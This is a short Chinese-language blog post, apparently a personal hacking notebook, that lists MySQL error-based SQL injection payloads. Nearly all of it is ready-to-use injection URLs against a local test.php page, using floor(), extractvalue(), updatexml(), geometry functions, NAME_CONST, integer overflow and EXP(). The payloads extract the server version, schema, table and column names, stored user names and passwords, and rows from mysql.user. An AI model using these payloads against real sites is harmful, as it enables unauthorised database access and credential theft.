---
layout: post
title: "Mysql 报错注入"
description: "Hacking"
author: Caijiji
category: Hacking
tags: [Hacking]
---

* 目录
{:toc}

## Mysql 报错注入

数据库结构 php源码参考[RickGray'Blog](http://rickgray.me/2014/11/16/error-based-sql-injection.html)


###1 floor()

Example

Show Version()

    http://0.0.0.0:8001/test.php?name=aa'and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)%23&pass=1

Show Databases

    http://0.0.0.0:8001/test.php?name=aa' AND (SELECT 3904 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)%23&pass=1

Show Tables

    http://0.0.0.0:8001/test.php?name=aa' AND (SELECT 3210 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x73716c69) LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)%23&pass=1

Show columns
    
    http://0.0.0.0:8001/test.php?name=aa' AND (SELECT 8575 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x75736572 AND table_schema=0x73716c69 LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)%23&pass=1

Show data
    
    http://0.0.0.0:8001/test.php?name=aa'+and(select 1 from(select count(*),concat((select (select (select concat(0x7,name,0x7e,pass,0x7e) from sqli.`user` limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23&pass=1

###2 Extractvalue()

    http://0.0.0.0:8001/test.php?name=111' and (extractvalue(1,concat(0x7e,(select user()))))%23&pass=1

    http://0.0.0.0:8001/test.php?name=111' and (extractvalue(1,concat(0x7e,(SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1))))%23&pass=1

    ....

###3 updatexml()
    
    http://0.0.0.0:8001/test.php?name=111' and(updatexml (1,concat(0x7e,(select user()),0x73),1))%23&pass=1
    
    http://0.0.0.0:8001/test.php?name=111' and(updatexml (1,concat(0x7e,((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1)),0x73),1))%23&pass=1
    
    ...

###4 GeometryCollection()
    
    http://0.0.0.0:8001/test.php?name=111' and GeometryCollection((select * from(select * from(select user())a)b))%23&pass=1
    
    http://0.0.0.0:8001/test.php?name=111' and GeometryCollection((select * from(select * from((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1))a)b))%23&pass=1

###5 polygon()
    
    http://0.0.0.0:8001/test.php?name=111' and polygon((select * from(select * from(select user())a)b))%23&pass=1
    
    http://0.0.0.0:8001/test.php?name=111' and polygon((select * from(select * from((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1))a)b))%23&pass=1

###6 multipoint()
    
    http://0.0.0.0:8001/test.php?name=111' and multipoint((select * from(select * from(select user())a)b))%23&pass=1
    
    http://0.0.0.0:8001/test.php?name=111' and multipoint((select * from(select * from((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1))a)b))%23&pass=1

###7 multilinestring()
    
    http://0.0.0.0:8001/test.php?name=111' and multilinestring((select * from(select * from(select user())a)b))%23&pass=1
    
    http://0.0.0.0:8001/test.php?name=111' and multilinestring((select * from(select * from((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1))a)b))%23&pass=1

###8 multipolygon()

    http://0.0.0.0:8001/test.php?name=111' and multipolygon((select * from(select * from(select user())a)b))%23&pass=1
    
    http://0.0.0.0:8001/test.php?name=111' and multipolygon((select * from(select * from((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1))a)b))%23&pass=1

###9 linestring()
    
    http://0.0.0.0:8001/test.php?name=111' and linestring((select * from(select * from(select user())a)b))%23&pass=1
    
    http://0.0.0.0:8001/test.php?name=111' and linestring((select * from(select * from((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1))a)b))%23&pass=1

###10 NAME_CONST()
   
    http://0.0.0.0:8001/test.php?name=111' and+1=(select+*+from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as+x)%23&pass=1

###11 整数溢出

    http://0.0.0.0:8001/test.php?name=aa' AND (select 1E308*if((select*from(select version())a limit 1)>(select version()),2,2))%23&pass=1
    
    http://0.0.0.0:8001/test.php?name=aa' AND (select 1E308*if((select*from(select*from mysql.user limit 1)a limit 1)>(select*from mysql.user limit 0),2,2))%23&pass=1

###12 EXP()
    
    http://0.0.0.0:8001/test.php?name=a' and EXP(~(SELECT*FROM(SELECT version())a))%23&pass=1
    
    http://0.0.0.0:8001/test.php?name=a' and EXP(~(SELECT*FROM((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1))a))%23&pass=1

From InterNet

元旦快乐
